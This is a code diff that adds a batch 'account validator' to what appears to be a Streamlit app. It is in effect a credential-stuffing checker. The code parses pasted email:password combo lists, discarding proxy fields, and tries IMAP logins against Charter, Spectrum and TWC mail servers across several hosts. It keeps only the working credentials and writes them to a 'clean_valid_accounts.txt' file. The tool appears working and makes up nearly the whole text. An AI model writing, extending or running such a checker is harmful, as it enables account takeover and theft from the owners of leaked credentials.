@@ -802,6 +802,119 @@ if valid:
         use_container_width=True
     )
 
+# -----------------------------------------------------------------------------
+# BATCH ACCOUNT PASTE & VALIDATOR BAR
+# -----------------------------------------------------------------------------
+st.sidebar.markdown("---")
+st.sidebar.subheader("📋 Batch Account Importer & Validator")
+batch_paste_input = st.sidebar.text_area(
+    "Paste Multiple Accounts (email:pass)", 
+    key="batch_paste_text", 
+    placeholder="user1@charter.net:pass1\nuser2@spectrum.net:pass2",
+    height=110
+)
+batch_host_override_input = st.sidebar.text_input("Batch IMAP Host Override (Optional)", key="batch_host_ov", placeholder="mobile.charter.net")
+
+if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", use_container_width=True):
+    lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
+    if not lines:
+        st.sidebar.error("Please paste at least one account in email:password format.")
+    else:
+        batch_logs = []
+        valid_count = 0
+        invalid_count = 0
+        
+        progress_bar = st.sidebar.progress(0)
+        status_display = st.sidebar.empty()
+        
+        timestamp_str = f"# Started:{time.strftime('%Y-%m-%d %H:%M:%S')}"
+        new_valid_entries = [timestamp_str]
+        
+        for idx, line in enumerate(lines):
+            # Parse email:pass and ignore extra proxy info if present
+            clean_line = line.split("|")[0].strip()
+            if ":" not in clean_line:
+                invalid_count += 1
+                batch_logs.append(f"❌ [SKIPPED] Invalid format: {line}")
+                continue
+            
+            email_val, pass_val = clean_line.split(":", 1)
+            email_val = email_val.strip()
+            pass_val = pass_val.strip()
+            
+            status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val}")
+            progress_bar.progress((idx + 1) / len(lines))
+            
+            # Determine hosts to try (including Spectrum/Charter/TWC defaults)
+            if batch_host_override_input.strip():
+                hosts_to_test = [batch_host_override_input.strip()]
+            else:
+                hosts_to_test = host_list(email_val)
+                domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""
+                if "charter" in domain_lower:
+                    hosts_to_test = ["mobile.charter.net", "imap.charter.net"] + hosts_to_test
+                elif "spectrum" in domain_lower:
+                    hosts_to_test = ["imap.spectrum.net", "mail.spectrum.net"] + hosts_to_test
+                elif "twc" in domain_lower:
+                    hosts_to_test = ["mail.twc.com"] + hosts_to_test
+
+            is_success = False
+            connected_h = ""
+            err_msg = ""
+            
+            for h in hosts_to_test:
+                test_m = None
+                try:
+                    test_m = imaplib.IMAP4_SSL(h, 993, timeout=15)
+                    test_m.login(email_val, pass_val)
+                    test_m.logout()
+                    connected_h = h
+                    is_success = True
+                    break
+                except Exception as ex:
+                    err_msg = str(ex)
+                    if test_m:
+                        try:
+                            test_m.logout()
+                        except:
+                            pass
+            
+            if is_success:
+                valid_count += 1
+                combo_str = f"{email_val}:{pass_val}"
+                new_valid_entries.append(combo_str)
+                batch_logs.append(f"✅ [VALID] {email_val} via {connected_h}")
+            else:
+                invalid_count += 1
+                batch_logs.append(f"❌ [INVALID] {email_val} — Error: {err_msg}")
+        
+        progress_bar.empty()
+        status_display.empty()
+        
+        if valid_count > 0:
+            block_content = "\n".join(new_valid_entries) + "\n\n"
+            existing_data = ""
+            if os.path.exists("clean_valid_accounts.txt"):
+                with open("clean_valid_accounts.txt", "r", encoding="utf-8", errors="ignore") as f:
+                    existing_data = f.read()
+            
+            with open("clean_valid_accounts.txt", "w", encoding="utf-8") as f:
+                f.write(block_content + existing_data)
+            
+            st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid: {invalid_count}")
+            st.session_state.batch_validation_logs = batch_logs
+            st.rerun()
+        else:
+            st.sidebar.warning(f"Batch validation complete. No valid accounts found. Invalid: {invalid_count}")
+            st.session_state.batch_validation_logs = batch_logs
+
+if "batch_validation_logs" in st.session_state and st.session_state.batch_validation_logs:
+    with st.sidebar.expander("📊 Live Batch Execution Stream & Analytics", expanded=True):
+        st.code("\n".join(st.session_state.batch_validation_logs), language="text")
+
+st.sidebar.markdown("---")
+# -----------------------------------------------------------------------------
+
 st.sidebar.text_input("Email override", key="custom_email")
 st.sidebar.text_input("Password override", type="password", key="custom_pass")
 st.sidebar.text_input("IMAP host override", key="custom_host")
